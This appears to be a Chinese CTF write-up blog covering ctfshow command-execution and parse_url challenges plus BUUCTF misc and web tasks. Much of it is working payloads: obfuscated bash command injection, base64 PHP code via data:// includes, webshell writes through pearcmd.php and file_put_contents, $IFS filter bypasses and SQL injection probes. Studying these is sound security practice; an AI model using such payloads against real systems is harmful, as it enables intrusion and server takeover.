<p>改成双引号 echo “$n”，结果就是3</p>
<p>[(9条消息) linux中单引号‘ ,双引号“, 反引号 <code> </code>, $, $(), ${}与变量_linux单引号中引用变量_TGAO的博客-CSDN博客](<a href="https://blog.csdn.net/qq_40491569/article/details/83688652#:~:text=%E5%8D%95%E5%BC%95%E5%8F%B7">https://blog.csdn.net/qq_40491569/article/details/83688652#:~:text=单引号</a> ：不进行转译和获取 变量 ，输出原字符串 echo ‘date’ date 双引号,Dec 29 10%3A33%3A40 CST 2020 echo date date)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(( ))属于执行计算公式，等价于$[ ]，$( )和` `属于命令替换，$&#123; &#125;属于变量替换</span><br></pre></td></tr></table></figure>

<p>bash里二进制可表示为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $((2#100))</span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<p> 但是由于把2过滤了，所以使用位运算符号构造出2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $((1&lt;&lt;1))</span><br><span class="line">2</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&lt;&lt;三个小于号(here-strings)，语法：command [args] &lt;&lt;&lt;[&quot;]$word[&quot;]；$word会展开并作为command的stdin</span><br></pre></td></tr></table></figure>

<p>解析一次后cat &#x2F;flag 为字符串</p>
<p>空格并没有被解析</p>
<p>使用两次here-strings，使其成为标准输入去执行这个复杂命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($((1&lt;&lt;1))#10001111))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10100100))\\$(($((1&lt;&lt;1))#101000))\\$(($((1&lt;&lt;1))#111001))\\$(($((1&lt;&lt;1))#10010010))\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10010011))\&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="极限命令执行4"><a href="#极限命令执行4" class="headerlink" title="极限命令执行4"></a>极限命令执行4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span><br><span class="line">//flag在根目录flag里</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>fuzz 一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://40e404d6-3af3-401c-b11c-9e48298fd1ce.challenge.ctf.show/&quot;</span><br><span class="line"> </span><br><span class="line">str= &quot;&quot;</span><br><span class="line">for i in range(255):</span><br><span class="line">    data = &#123;&#x27;ctf_show&#x27;:chr(i)&#125;</span><br><span class="line">    retext = requests.post(url,data=data).text</span><br><span class="line">    if &quot;??????&quot; in retext:</span><br><span class="line">        print(1)</span><br><span class="line">    else:</span><br><span class="line">        str += chr(i)</span><br><span class="line"> </span><br><span class="line">print(str)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!#$&amp;&#x27;()0&lt;\_&#123;&#125;~</span><br></pre></td></tr></table></figure>

<p>1没了构造1,$: 第一个#是计算字符长度，第二个#是字符串的名字。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $&#123;##&#125;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;00$&#123;##&#125;00))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;000))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;00$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>



<h2 id="极限命令执行5"><a href="#极限命令执行5" class="headerlink" title="极限命令执行5"></a>极限命令执行5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span><br><span class="line">//flag在根目录flag里</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>fuzz一下，还剩 <code>! $ &amp; &#39; ()&lt;+\-&#123;&#125;~</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $(())</span><br><span class="line">结果为0</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=__=$(())%26%26$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$(())\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/GTL-JU/p/17128363.html">ctfshow-极限命令执行复现 - GTL_JU - 博客园 (cnblogs.com)</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span>=<span class="string">&#x27;http://username:password@hostname:9090/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(8) &#123;</span><br><span class="line">  [&quot;scheme&quot;]=&gt;</span><br><span class="line">  string(4) &quot;http&quot;</span><br><span class="line">  [&quot;host&quot;]=&gt;</span><br><span class="line">  string(8) &quot;hostname&quot;</span><br><span class="line">  [&quot;port&quot;]=&gt;</span><br><span class="line">  int(9090)</span><br><span class="line">  [&quot;user&quot;]=&gt;</span><br><span class="line">  string(8) &quot;username&quot;</span><br><span class="line">  [&quot;pass&quot;]=&gt;</span><br><span class="line">  string(8) &quot;password&quot;</span><br><span class="line">  [&quot;path&quot;]=&gt;</span><br><span class="line">  string(5) &quot;/path&quot;</span><br><span class="line">  [&quot;query&quot;]=&gt;</span><br><span class="line">  string(9) &quot;arg=value&quot;</span><br><span class="line">  [&quot;fragment&quot;]=&gt;</span><br><span class="line">  string(6) &quot;anchor&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=http://system(&quot;cd%20..;cd%20..;cd%20..;tac%20fl*&quot;);</span><br></pre></td></tr></table></figure>

<p>官方payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=aa://eval(base64_decode(&#x27;c3lzdGVtKCJjYXQgL2ZsYWdfaXNfaGVyZS50eHQiKTs=&#x27;));/aaa</span><br></pre></td></tr></table></figure>



<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=http://data:://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgL18qIik/Pg==</span><br></pre></td></tr></table></figure>

<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$data</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=data::;base64,PD9waHAgc3lzdGVtKCdscyAvJyk7Pz4=</span><br></pre></td></tr></table></figure>

<p>解法二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=..://aaa/../../../../../../usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=`$_POST[1]`;?&gt;+1.php</span><br></pre></td></tr></table></figure>

<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=http://cd%20..;cd%20..;cd%20..;tac%201*</span><br></pre></td></tr></table></figure>

<p>解法二：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=ctfshow://`echo &#x27;Y2F0IC8xX2YxYWdfMXNfaDNyZQ==&#x27;|base64 -d`/h1xa</span><br></pre></td></tr></table></figure>



<h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]));</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$$$$$$host</span>;</span><br></pre></td></tr></table></figure>

<p>变量覆盖</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=user://pass:query@scheme/?fragment%23data://,&lt;?php system(&#x27;cat /_f1ag_1s_h3ree&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>], <span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=ctfshow://&lt;script language=&#x27;php&#x27;&gt;eval($_POST[1]);/var/www/html/1.php</span><br></pre></td></tr></table></figure>

<p>写入shell</p>
]]></content>
  </entry>
  <entry>
    <title>buu_misc</title>
    <url>/2023/01/24/buu%E5%90%88%E9%9B%86-buu-misc/</url>
    <content><![CDATA[<p>  buu第一页。</p>
 <span id="more"></span>

<h1 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h1><p>010打开第二行6，7即高度</p>
<p>flag{He1lO_d4_ba1}</p>
<h1 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h1><p>题目 ：黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案) 注意：得到的 flag 请包上 flag{} 提交</p>
<p>根据提示直接过滤出POST包</p>
<p>http.request.method&#x3D;&#x3D;POST</p>
<p>flag{ffb7567a1d4f4abdffdb54e022f8facd}</p>
<h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><p>未加密：</p>
<p>文件头中的全局方式位标记为00 00</p>
<p> 目录中源文件的全局方式位标记为00 00</p>
<p>伪加密：</p>
<p>文件头中的全局方式位标记为00 00</p>
<p>目录中源文件的全局方式位标记为09 00</p>
<p>真加密：</p>
<p>文件头中的全局方式位标记为09 00</p>
<p>目录中源文件的全局方式位标记为09 00</p>
<p><a href="https://blog.csdn.net/xiaozhaidada/article/details/124538768">(6条消息) CTF——zip伪加密_xiaozhaidada的博客-CSDN博客</a></p>
<p>flag{Adm1N-B2G-kU-SZIP}</p>
<h1 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h1><p>某黑客潜入到某公司内网通过嗅探抓取了一段文件传输的数据，该数据也被该公司截获，你能帮该公司分析他抓取的到底是什么文件的数据吗？ 注意：得到的 flag 请包上 flag{} 提交</p>
<p><a href="https://files.buuoj.cn/files/ff965ff87437e3fda765ba928da94821/efa02e35-ee20-476f-94a2-cadbcef7d076.zip"> efa02e35-ee20-476f-94a2-cadbcef7d076.zip</a></p>
<p>解法一</p>
<p>根据提示，文件传输直接找POST的包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.request.method==POST</span><br></pre></td></tr></table></figure>

<p>解法二</p>
<p>查找字符<strong>flag.</strong></p>
<p>追踪流tcp流打开</p>
<p>flag{da73d88936010da1eeeb36e945ec4b97}</p>
<h1 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h1><p><a href="https://www.online-qr-scanner.com/zh-cn/">在线二维码扫描器 (online-qr-scanner.com)</a></p>
<p>解法二</p>
<p>微信扫一下</p>
<p>flag{878865ce73370a4ce607d21ca01b5e59}</p>
<h2 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h2><p>flag{st3g0_saurus_wr3cks}</p>
<h2 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h2><p>01101011011011110110010101101011011010100011001101110011</p>
<p> 在文件最后找到一串二进制数字，以8 位为一组，转换为10进制，再对照ASCII码表得出字符。最后以flag格式提交。flag{koekj3s}</p>
<h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p>d盾查一下就出来了但是文件修改过了，但flag没改，</p>
<p>但无所谓了</p>
<p>后门查杀同上题</p>
<p>flag{6ac45fb83b3bc355c024f5034b947dd3}</p>
<p><a href="https://so.csdn.net/so/search?q=zlib&spm=1001.2101.3001.7020">zlib</a>是PNG IDAT的可选压缩格式</p>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu_web</title>
    <url>/2023/02/01/buu%E5%90%88%E9%9B%86-buu-web/</url>
    <content><![CDATA[<p>   buu第一页。</p>
 <span id="more"></span>

<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="comment">//判断$page是否存在于$whitelist数组中，存在则返回true</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//从<span class="number">0</span>截取到？</span><br><span class="line">            );<span class="comment">//.&#x27;?&#x27;在结尾补?</span></span><br><span class="line">            <span class="comment">//mb_strpos()mb_strpos — 查找字符串在另一个字符串中首次出现的位置</span></span><br><span class="line">              <span class="comment">//mb_substr() 函数根据 start 和 length 参数返回 str 中指定的部分</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="comment">//截取后是否存在在白名单</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) <span class="comment">//checkFile校验</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>“.&#x2F;“：代表目前所在的目录。</strong></p>
<p><strong>“ . .&#x2F;“代表上一层目录。</strong></p>
<p><strong>“&#x2F;“：代表根目录。</strong></p>
<p>注： 确保url解码后能通过白名单。浏览器会解码一次，而 ? 经过一次urlencode编码为：%3f；两次为：%253f</p>
<p>payload:<code>/source.php/?file=hint.php%253f../../../../../ffffllllaaaagggg</code></p>
<p><code> </code>flag{cda6b5c3-dab2-42fb-a21e-6e7280953804}</p>
<h2 id="ACTF2020-新生赛-Include–伪协议"><a href="#ACTF2020-新生赛-Include–伪协议" class="headerlink" title="[ACTF2020 新生赛]Include–伪协议"></a>[ACTF2020 新生赛]Include–伪协议</h2><p>伪协议</p>
<p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p>
<p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>flag{bc539291-7afe-46da-9629-52bb02de6ffb}</p>
<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>127.0.0.1;ls &#x2F;;</p>
<p>127.0.0.1;cat &#x2F;flag;</p>
<p>flag{b48b1925-822a-46b7-8cdc-db7b94b1604e}</p>
<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>打开后&#x2F;?ip&#x3D;</p>
<p>get传参ip&#x3D;1时</p>
<p>返回</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PING 1 (0.0.0.1): 56 data bytes</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PING 2 (0.0.0.2): 56 data bytes</span><br></pre></td></tr></table></figure>

<p>猜测是一个计算机指令，ip的值为ip地址</p>
<p>?ip&#x3D;127.0.0.1;ls</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">flag.php</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure>

<p>cat flag.php</p>
<p>发现空格被过滤，flag，* ？被过滤</p>
<p>?ip&#x3D;127.0.0.1;cat$IFS$1index.php ，发现源码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>绕过方法</p>
<ol>
<li>$IFS</li>
<li>${IFS}</li>
<li>$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行</li>
<li>&lt; </li>
<li>&lt;&gt; </li>
<li>{cat,flag.php}  &#x2F;&#x2F;用逗号实现了空格功能</li>
<li>%20 </li>
<li>%09</li>
</ol>
<p>只能用$IFS$1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat `ls` #查看当前目录的所有文件的内容。</span><br><span class="line"></span><br><span class="line">cat *     #查看当前目录的所有文件的内容。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>

<p>查看源代码</p>
<p>flag{4fe89af8-21fb-405b-81f1-bb4510e5d776}</p>
<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>测试 1’ or 1&#x3D;1 # ,初步判定存在SQL注入。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 #</span></span><br></pre></td></tr></table></figure>

<p>再测试字段数，到3时报错，说明字段数为2.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 1 # </span></span><br></pre></td></tr></table></figure>

<p>接着尝试union注入,回显了过滤的关键字。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2#</span></span><br></pre></td></tr></table></figure>

<p>堆叠注入”<br>原理，就是通过 ; 号注入多条SQL语句</p>
